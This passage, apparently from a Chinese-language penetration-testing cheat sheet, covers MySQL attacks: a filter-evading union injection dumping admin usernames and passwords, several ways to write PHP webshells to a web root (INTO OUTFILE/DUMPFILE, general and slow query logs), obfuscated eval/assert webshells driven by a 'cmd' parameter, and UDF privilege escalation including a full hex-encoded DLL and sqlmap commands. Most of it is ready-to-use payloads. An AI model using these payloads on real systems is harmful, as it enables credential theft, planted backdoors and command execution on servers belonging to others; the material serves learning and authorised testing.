class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/*//////*/</span><span class="hljs-comment">/*!50441select*/</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-keyword">password</span>),group_concat(username) <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span><br></code></pre></td></tr></table></figure><p>fuzz</p><h2 id="mysql写shell、提权"><a href="#mysql写shell、提权" class="headerlink" title="mysql写shell、提权"></a>mysql写shell、提权</h2><h3 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h3><p>一般情况下 Linux 系统下面权限分配比较严格，MySQL 用户一般情况下是无法直接往站点根目录写入文件的，在 Windows 环境下成功率会很高。</p><h4 id="outfile和dumpfile"><a href="#outfile和dumpfile" class="headerlink" title="outfile和dumpfile"></a>outfile和dumpfile</h4><p>条件</p><ol><li><p>要知道网站绝对路径，可以通过报错，phpinfo界面，404界面等一些方式知道</p></li><li><p>gpc为off，on的话单引号被转义了，语句就不能正常执行了</p></li><li><p>要有file权限，默认情况下只有root有</p></li></ol><p><code>select user,file_priv from mysql.user;</code></p><ol start="4"><li><p>对目录要有写权限</p></li><li><p><code>secure_file_priv</code>的值非NULL或为导出的绝对路径</p></li></ol><p>​secure_file_priv的值在mysql配置文件my.ini中设置，这个参数用来限制数据导入导出<br>​Mysql&gt;&#x3D;5.5.53 默认为NULL，即默认禁止导入导出<br>​Mysql&lt;5.5.53 默认为空，即默认无限制</p><p>​<code>show global variables like &#39;%secure_file_priv%&#39;;</code></p><h4 id="union"><a href="#union" class="headerlink" title="union"></a>union</h4><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?id=1&#x27; union select 1,&#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;,3 into outfile &#x27;C:/shell.php&#x27;%23</span><br><span class="language-xml">?id=1&#x27; union select 1,&#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;,3 into dumpfile &#x27;C:/shell.php&#x27;%23</span><br><span class="language-xml"></span><br><span class="language-xml">hex</span><br><span class="language-xml">id=-1&#x27; union select 1,0x3c3f70687020706870696e666f28293b3f3e,3 into outfile &quot;C:/shell.php&quot;%23</span><br></code></pre></td></tr></table></figure><h4 id="非union"><a href="#非union" class="headerlink" title="非union"></a>非union</h4><p>使用<code>fields terminated by</code>与<code>lines terminated by</code>写shell</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?id=1 into outfile &#x27;C:/info.php&#x27; FIELDS TERMINATED BY &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;%23</span><br><span class="language-xml">?id=1 into outfile &#x27;C:/info.php&#x27; FIELDS TERMINATED BY 0x3c3f70687020706870696e666f28293b3f3e %23</span><br><span class="language-xml">?id=1 into outfile &#x27;C:/info.php&#x27; lines terminated by &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;%23</span><br><span class="language-xml">?id=1 into outfile &#x27;C:/info.php&#x27; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e %23</span><br></code></pre></td></tr></table></figure><h4 id="outfile和dumpfile的区别"><a href="#outfile和dumpfile的区别" class="headerlink" title="outfile和dumpfile的区别"></a>outfile和dumpfile的区别</h4><p><strong>outfile</strong></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">支持多行数据同时导出<br>使用<span class="hljs-built_in">union</span>联合查询时，要保证两侧查询的列数相同<br>会在换行符制表符后面追加反斜杠<br>会在末尾追加换行(所以不能直接写入二进制文件)<br></code></pre></td></tr></table></figure><p><strong>dumpfile</strong></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle">每次只能导出一行数据<br>不会在换行符制表符后面追加反斜杠<br>不会在末尾追加换行<br>如果服务器端本身的查询语句，结果有多行，但是我们又想使用<span class="hljs-keyword">dump</span> <span class="hljs-keyword">file</span>，应该手动添加 limit 限制<br></code></pre></td></tr></table></figure><h3 id="日志写shell-general-log"><a href="#日志写shell-general-log" class="headerlink" title="日志写shell(general_log)"></a>日志写shell(general_log)</h3><p><code>secure_file_priv</code><br> Mysql&gt;&#x3D;5.5.53 默认为NULL，即默认禁止导入导出<br> Mysql&lt;5.5.53 默认为空，即默认无限制</p><p>在5.5.53版本后无法用sql语句修改<code>secure_file_priv</code> ，利用日志将shell写入日志中</p><p>条件</p><ol><li><p>对目录要有写权限</p></li><li><p>高权限运行 MySQL 或者 Apache</p></li></ol><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">查看配置，日志是否开启，和mysql默认log地址(记下原地址方便恢复)</span><br><span class="language-xml">show variables like &#x27;%general%&#x27;;</span><br><span class="language-xml">开启日志监测，默认关闭(如果一直开文件会很大的)</span><br><span class="language-xml">set global general_log = on;</span><br><span class="language-xml">设置日志路径</span><br><span class="language-xml">set global general_log_file = &#x27;/var/www/html/info.php&#x27;;</span><br><span class="language-xml">执行查询，写入shell</span><br><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;;</span><br><span class="language-xml">结束后，恢复日志路径，关闭日志监测</span><br><span class="language-xml">set global general_log = off;</span><br><span class="language-xml"></span><br><span class="language-xml">SQL查询免杀shell</span><br><span class="language-xml">select &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$sl</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;&#x27;</span>, @<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-variable">$sl</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;;</span><br><span class="language-xml"></span><br><span class="language-xml">SELECT &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;f&#x27;</span>=&gt;<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;pffff&#x27;</span>=&gt;<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>=&gt;<span class="hljs-string">&#x27;fffff&#x27;</span>,<span class="hljs-string">&#x27;lfaaaa&#x27;</span>=&gt;<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;nnnnn&#x27;</span>=&gt;<span class="hljs-string">&#x27;t&#x27;</span>);<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">array_keys</span>(<span class="hljs-variable">$p</span>);<span class="hljs-variable">$_</span>=<span class="hljs-variable">$p</span>[<span class="hljs-string">&#x27;pffff&#x27;</span>].<span class="hljs-variable">$p</span>[<span class="hljs-string">&#x27;pffff&#x27;</span>].<span class="hljs-variable">$a</span>[<span class="hljs-number">2</span>];<span class="hljs-variable">$_</span>= <span class="hljs-string">&#x27;a&#x27;</span>.<span class="hljs-variable">$_</span>.<span class="hljs-string">&#x27;rt&#x27;</span>;<span class="hljs-variable">$_</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]));<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;;</span><br></code></pre></td></tr></table></figure><h3 id="慢查询getshell-slow-query-log"><a href="#慢查询getshell-slow-query-log" class="headerlink" title="慢查询getshell(slow_query_log)"></a>慢查询getshell(slow_query_log)</h3><p>如果是普通日志，开启日志监测后文件会很大，网站访问量大的话我们写的shell会出错</p><p>使用慢查询日志时，只有当查询时间超过系统时间时才会记录在日志中</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql">查看慢查询信息是否开启<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%slow_query_log%&#x27;</span>;<br>启用慢查询日志(默认禁用)<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> slow_query_log<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br>修改日志文件路径<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> slow_query_log_file<span class="hljs-operator">=</span><span class="hljs-string">&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;</span>;<br>查看写入慢日志的时间要求<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%long_query_time%&#x27;</span>        <br>执行查询，写入shell<br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php @eval($_POST[abc]);?&gt;&#x27;</span> <span class="hljs-keyword">or</span> sleep(<span class="hljs-number">11</span>);<br></code></pre></td></tr></table></figure><h2 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h2><p><code>user defined function</code>，用户自定义函数，是数据库功能的一种扩展。用户通过自定义函数可以实现在 MySQL 中无法方便实现的功能，其添加的新函数都可以在 SQL 语句中调用，就像调用本机函数 version () 等方便。</p><p>udf在<code>mysql&gt;=5.1</code>的版本中，存在于<code>mysql/lib/plugin</code>目录下，文件后缀为.dll，常用c语言编写。</p><h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">查看secure_file_priv<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure_file_priv%&#x27;</span>;<br>查看插件目录<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%plugin%&#x27;</span>;<br>如果没有，手工创建（mysql5<span class="hljs-number">.1</span>以后基本不可能成功）<br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;D:\\env\\php\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin::$index_allocation&#x27;</span>;<br>上传dll后，创建自定义函数<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_eval <span class="hljs-keyword">returns</span> string soname <span class="hljs-string">&#x27;lib_mysqludf_sys_64.dll&#x27;</span>;<br>导入成功后查看一下mysql函数里面是否新增了sys_eval函数：<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> mysql.func <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;sys_eval&#x27;</span>;<br>执行命令<br><span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>删除函数<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">function</span> sys_eval;<br></code></pre></td></tr></table></figure><p>这里注意如果有webshell可以直接上传dll或so文件就直接上传即可</p><p>如果有注入，但是无webshell，可以利用sqlmap，因为 GET 有<strong>字节长度限制</strong>，所以往往 POST 注入才可以执行这种攻击</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">sqlmap -u  <span class="hljs-string">&quot;http://localhost:3306/&quot;</span> --data<span class="hljs-operator">=</span><span class="hljs-string">&quot;id=1&quot;</span> --file-write<span class="hljs-operator">=</span><span class="hljs-string">&quot;./lib_mysqludf_sys_64.so&quot;</span>  --file-dest<span class="hljs-operator">=</span><span class="hljs-string">&quot;/usr/lib/mysql/plugin/udf.so&quot;</span>  <br></code></pre></td></tr></table></figure><p>如果没有注入，但可以操作原生sql语句，例如进入phpmyadmin中</p><p>利用16进制into dumpfile写入，具体payload查询：<a href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">直接 SELECT 查询十六进制写入<br>SELECT 0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f80000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a24000000000000004d477bd0092615830926158309261583005e86830b261583005e808308261583005e968307261583005e91830b2615832ee06e830a2615830926148325261583005e9c8308261583005e878308261583005e8483082615835269636809261583000000000000000000000000000000000000000000000000504500004c0103004afe9f5a0000000000000000e00002210b010900001000000010000000600000607c0000007000000080000000000010001000000002000005000000000000000500000000000000009000000010000000000000020000000000100000100000000010000010000000000000100000007c83000008020000b4820000c800000000800000b402000000000000000000000000000000000000848500001000000000000000000000000000000000000000000000000000000000000000000000002c7e00004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000600000001000000000000000040000000000000000000000000000800000e0555058310000000000100000007000000010000000040000000000000000000000000000400000e02e7273726300000000100000008000000006000000140000000000000000000000000000400000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332e393100555058210d090208b92bcf11b11ceea24f550000560c000000220000260000a8ffffffff8b4c240833c03901741656578b7c24146a0c59be000010dcf3a566a55fb0015e5dfb77fbc38b44240c1a6a071611108bf8183218ff63db6f1ca45fc7011e1200210883380175128b40040df6776f0700750a1004c6000132c0c3530abf1df68d3c3053a454082d08ff30ff15fff6ee776c885985c075085614c601011bc8568d71018a11fd6fdffe4184d275f98b54142bce890a32558bec8b4d0c833902b7d860bf5374148b7d10915c5453eb4cbf9dbddf8b417d740f1b707c1bebe5836004dbb1ffb7001a0c8b48048b008d4401025072a0594c08dfc8d7b5891678113006a44ceb6c57beb7b2b85f5e5da30421740833dbb63ff6a8591353568b742410d878534602db85db5bb6460851c78d5c4257e8240b75eeeebfe01400c604070008ff70041e0553b1db1b921a22c418535720030054090f09b7086a995b0f98599954cf2d343713b8f4540b1edeb60d818403552251519d35dffed6fedf576800f762d66a018945fc068bf08b4560dd7ff70cc606004533ff595939387471683cc071c6fedfda9c12260c3bc7745b506a04ff75fc149073e1edd7a9fd48533afc8d48911040b963dbff2bc18bd88d043b505630f8268c5330d8ad8dbd5f03fe570e940de57df8463fe6364c2066ba5b1810a4803e0059169eb0ff741a8bc6c64437ff00594d1489c906987bebd86f183e5f205ec9c3eed7b235dcbaf37d574708c45030087bdbdacdc9c26a4078c710548d4601b9e07e614251724f0856ff31cf6bafdd9db694c66aff8dc32082f63a58b0b6030d092c23005f7cc36e57036c6a081d1290ac0aa88365fc2f6c2f2c2d4592d0eb071b408f65e8c70bbfd66e42feff000d1fedc25e3bffdb17b60d08209a02f3c3e90806f58bff56688000002d8c6d675880985608845aa3bde0febb062358045485f675054daa83260076fbb7db4508c36f08ed09acc704240607ff0b4c113637598d71ffcf9c0bbf77dfc9750e39056b107e3cff7310830b01fbeec6bb8b0910548b098f57890a23480f85d47d618cbbad641718068b79040838071b76edeebb1e50eb184aa705b8e61768b0b030d8e803a83c0957c1d6bbaeb5d6a1e7e9e2573ca12f4c6a6ff777c3025efd096a1fee76eb3caa10c80475ed7befc0c7051f281a70e027071bdff79d5cb520bc04b81b6a5635b952eb782b7339b2e3696ff7defd7340393d155c741c68062809ac43db6b85850d9e1034252316ffe666f862f154b201dc0801592cc2b1a1db78049ddfdbf62413d90fd4fc83f80266b16f6cb0d2595bffa0584b77783bb5783106350f8487c71996ee4cd3543bf81810897d82efc796be35fac87251833f8af36a7c398587b4f10774e9ffc8d60f7c89c5db9bb5d955f85615441b474ded5be38ef88a394d1003d00874b48909437aa36d020c1ad3f8eba71c3162cc5a64442e386161fb0a58064c32fc19503f1bdf720443375bc9c20cc710fb02231fb2288b2ef28b5d081cae0fdb9b54e433c95cfc7d2008016c2dc6c23bf15a393a4417e4d61bfe7fafae3bf0740583fe02752e1910d03bc1e7166eb8ed57565fd03b5ee40003937b703b67115a039614168012376c7d270a8227fea0246420575062b30d661327002f527f8df61ad2061153f76a037543b067bb614f34032168742e2c0d2c3cec257feb1b71ec5a09706a7c6faae05051597c64825d900eadf62ffa8a19066b8f91b6c72ae490c396ec1640e134a9ff3b246abb41c1f17926547dbc550c0d381e33bc05bc595d382281ec2832f7869f365f212043211c895e2118891d05f78ec243143c21a2aa210c668c186c5ffbda3806252c0620080605dd2dcdd20425002d7ffc9c8f7ab6b1f6143095562407042831d6fedb7f0807348b85e0fca0aa701ddbb5b395011c1920241318092b18476a565f201cb360c32c9f7b8985d8320a04dc03b557e01b243468dedfd1f7d8d360ce2879d40a2c833d208dbdc3da00f923685b1b300bdfaf67f534c97f23401ec25f6a4849918f144a50152e9df458aaf8a29c10f3eb67611c7e052c37d4598feded8321b9273551e0f5ee3bdc0abf03e4507f4b8417185bdb7e600bce1cdc142cd6e288b154b609e01b14f413160a4bdb313ddcdbffdc84676cc859d94e1e07f7d81bf076bbb7c00359485d1656b8bc18be04a3638b6f2af83bc673080753025073d85f60835a3bfe72f15f5e25206c6053c820cc006f35b4dd452bb84d5a346627040b85bf2b5e6e413c03c1813850e45fefa5ecfffb33d2b90b011c48180f94c28bc25dc33fb702bf35e34831c80fb74114ae057106c1a55b6c33578c081817761bffff2ff1d7487bf972098b580803d93bfb720a4283c0283bd67270ca36b5e86ae55dc38f6afef0cd71f7a970040b056418005083ec080db7c670082f316c33c576f0852f06df64a31a89b90968555db7f081f0b2091c6b04f555972dd12c937d1350195c083b04e1c26f2724c1e81ff715e0018fefb6532b034f230059948be55dc3621ddb49a301ca3dafc0fae99525242631ccff29343232b61058054c50ac2cb41e97af12b60d56096b27d7616b20cfb0fbef2ae4e03160031f73d9665b9a6c038d2be0fafc046ba039f13cb4fc8a0d6c120c7d0dc395c3c1619c965154147fe41f3e783124f020140bdac40e5643b25d53ec1068f885626df4f888c9bf4ee640bb25eea0398466820d85c33149db9f0a359a04eb605675f869639fc1f6448b7598751f1033f0071476e6ca20189d271cb4f6ee6fedf4330c113bf77507be4f59eb0b85f30a7b047ea10ac1e0100bf0ce00f7d6076c840d1e045e5f01c33f5c05646464646064686c1405766474b000003ff4c20e034b0f20185f4e6f20ffffb7ff617267756d656e7473096c6c6f77656420287564663a206c69625f6dccfd6df77973716c0d5f73085f696e666f293918dfb6ff8f2076657273696f6e20302e01341f45787065f6dbdbdd637447657861076c79201a65207374723f5bdb5afb672074791b75726171217258c00e602b7477911fd86f030b3f8672206e616d48dbb1b71f436f756c246e6f74c4636113203058b76d186d2779af72f1483fda4d943f2003121071051bf29d5860214707d0604d0d0b0f81cb074ed961dd9703ab17cc2708a77527ecc00fd81f0a3b034fc0a07b851f03240328c1556583a200c5889251ca22d877bdb119bf44ff000f5565a3aa00a8aa9251645455c95532aaaafff61d455c0410020157616974466f00fc06c07253886c654f626a07c07f6b99145669727475616c417603e0f6370d536574456e76126f6ec000bc6dbf5661726961622b4118437265f76deb6e94546806640d47264375727222cd12f65b502a636573734914266e03e083135469636bde6e6bb1f6b6fd5175657279500366846d616e371667ef1b00fd0144697367374cfdb7eded6962727879436192731a4973446562756767edee6dad266a686546a4556e6840b1b7b7b7643164457846707469af46696c4a6d295b6119b41254de64aeb0176d0dd8114990b9edd61a0a6b409d6d70876547c25a73cd517f77555122b4ed6e591b5c537973186deec3c2eb2e39417373650975697cdb15da434c7d5f687e396d5f2edffedebe5f616d7367087869740b646a753a5f666469ec4217b076260a639a5f64fd6cadb91f5f686f6f6b131459725ff802700148d15fdb9ceb0249730a330a6c21d6f0bd82539c2a64d46e640893050b130f651e6b5b7bc25f2c723456ed6d1c182ff6d69a700a035f706f522947e1ddbe6e106468756c5eb92a6bcb92bd9b1b2ca806e0b6d86e6ec57265250866112e827bdb5673749c637079082439edcd5c6b32c06e4d0fd7ed1f5ac36f7319663a1f5f4370705831c75e3b8474bc6d343f001817ffffffff3d193c1c1b161e55142d16270815270f11115f10130a070d2e17090705160c1e7ffbffff080a0b160918181505061b050c10060717062105110f061421110b08e4fbdfb62b22052a111d0d18532d483806000776fbdbe5080c09330a090b0c051007061612eedffeed0e0b34150b18160d3d0542c205121e14066930ffd8ddff110c0e1d4d0517230d0c3224080b4506f0de041004f03b0a6eff2c01043808041c1c0204003e4c016dff21fd05004afe9f5a8fe00002210b0109080c634f7ad60c1213d616a300200e10c10a01630b02ab3362b7ee6107006003040233351eeed9c0ce34100706c02633d6eddb7620ac22033c144002b0021c5759dd0050520143c8c8ba65b1214200a7b82f06db5d182eb4787407ea0b900c5bfa90cdb742602e72647d610861c90e76c508fb0a00c700a1db66bb77402e26300304301becdb943d001a27c04f73726300eb11c0061b40731c4f78c2c2a365761f01030002ed7760497b27421ba023030000edd8d152127c53030400000000000080ff00000000000000000000807c2408010f85b901000060be007000108dbe00a0ffff5783cdffeb0d9090908a064688074701db75078b1e83eefc11db72edb80100000001db75078b1e83eefc11db11c001db73ef75098b1e83eefc11db73e431c983e803720dc1e0088a064683f0ff747489c501db75078b1e83eefc11db11c901db75078b1e83eefc11db11c975204101db75078b1e83eefc11db11c901db73ef75098b1e83eefc11db73e483c10281fd00f3ffff83d1018d142f83fdfc760f8a02428807474975f7e963ffffff908b0283c204890783c70483e90477f101cfe94cffffff5e89f7b92a0000008a07472ce83c0177f7803f0075f28b078a5f0466c1e808c1c01086c429f880ebe801f0890783c70588d8e2d98dbe005000008b0709c0743c8b5f048d8430b472000001f35083c708ff96f0720000958a074708c074dc89f95748f2ae55ff96f472000009c07407890383c304ebe16131c0c20c0083c7048d5efc31c08a074709c074223cef771101c38b0386c4c1c01086c401f08903ebe2240fc1e010668b0783c702ebe28baef87200008dbe00f0ffffbb0010000050546a045357ffd58d871702000080207f8060287f585054505357ffd558618d4424806a0039c475fa83ec80e9ad98ffff0000004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000030001010220010010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005c80000056020000e404000000000000584000003c617373656d626c7920786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e763122206d616e696665737456657273696f6e3d22312e30223e0d0a20203c7472757374496e666f20786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e7633223e0d0a202020203c73656375726974793e0d0a2020202020203c72657175657374656450726976696c656765733e0d0a20202020202020203c726571756573746564457865637574696f6e4c6576656c206c6576656c3d226173496e766f6b6572222075694163636573733d2266616c7365223e3c2f726571756573746564457865637574696f6e4c6576656c3e0d0a2020202020203c2f72657175657374656450726976696c656765733e0d0a202020203c2f73656375726974793e0d0a20203c2f7472757374496e666f3e0d0a20203c646570656e64656e63793e0d0a202020203c646570656e64656e74417373656d626c793e0d0a2020202020203c617373656d626c794964656e7469747920747970653d2277696e333222206e616d653d224d6963726f736f66742e564339302e435254222076657273696f6e3d22392e302e32313032322e38222070726f636573736f724172636869746563747572653d2278383622207075626c69634b6579546f6b656e3d2231666338623362396131653138653362223e3c2f617373656d626c794964656e746974793e0d0a202020203c2f646570656e64656e74417373656d626c793e0d0a20203c2f646570656e64656e63793e0d0a3c2f617373656d626c793e504100000000000000000000000010830000f08200000000000000000000000000001d83000008830000000000000000000000000000000000000000000028830000368300004683000056830000648300000000000072830000000000004b45524e454c33322e444c4c004d5356435239302e646c6c00004c6f61644c69627261727941000047657450726f634164647265737300005669727475616c50726f7465637400005669727475616c416c6c6f6300005669727475616c467265650000006672656500000000000000004afe9f5a0000000058840000010000001200000012000000a4830000ec8300003484000021100000a312000000100000a4120000a3120000a0120000cc110000a31200009811000086110000a31200009811000076100000a3120000431000002e1100001a110000a91000006d84000083840000a0840000bb840000c7840000da840000eb840000f484000004850000128500001b8500002b8500003985000041850000508500005d850000658500007485000000000100020003000400050006000700080009000a000b000c000d000e000f00100011006c69625f6d7973716c7564665f7379732e646c6c006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f62696e6576616c007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f6576616c007379735f6576616c5f6465696e6974007379735f6576616c5f696e6974007379735f65786563007379735f657865635f6465696e6974007379735f657865635f696e6974007379735f676574007379735f6765745f6465696e6974007379735f6765745f696e6974007379735f736574007379735f7365745f6465696e6974007379735f7365745f696e69740000000000700000100000006d3c683e6c3e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 INTO DUMPFILE &#x27;D:<span class="hljs-symbol">\\</span>env<span class="hljs-symbol">\\</span>php<span class="hljs-symbol">\\</span>phpstudy_pro<span class="hljs-symbol">\\</span>Extensions<span class="hljs-symbol">\\</span>MySQL5.7.26<span class="hljs-symbol">\\</span>lib<span class="hljs-symbol">\\</span>plugin<span class="hljs-symbol">\\</span>udf.dll&#x27;;<br></code></pre></td></tr></table></figure><p>dll和so文件</p><p>sqlmap中<code>.dll</code>和<code>.so</code>文件的路径：<code>sqlmap/data/udf/mysql</code></p><p>不过 sqlmap 中 自带这些动态链接库为了防止被误杀都经过编码处理过，不能被直接使用。不过可以利用 sqlmap 自带的解码工具<code>cloak.py</code>来解码使用</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">└─<span class="hljs-variable">$pwd</span><br><span class="hljs-regexp">/mnt/</span>c<span class="hljs-regexp">/Penetration/</span>DatabaseTools<span class="hljs-regexp">/SQLMap/</span>extra/cloak<br><span class="hljs-comment"># 解码 32 位的 Linux 动态链接库</span><br>└─<span class="hljs-variable">$python3</span> cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/linux/</span><span class="hljs-number">32</span>/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so<br><span class="hljs-comment"># 解码 64 位的 Linux 动态链接库</span><br>└─<span class="hljs-variable">$python3</span> cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/linux/</span><span class="hljs-number">64</span>/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so<br><span class="hljs-comment"># 解码 32 位的 Windows 动态链接库</span><br>└─<span class="hljs-variable">$python3</span> cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/windows/</span><span class="hljs-number">32</span>/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll<br><span class="hljs-comment"># 解码 64 位的 Windows 动态链接库</span><br>└─<span class="hljs-variable">$python3</span> 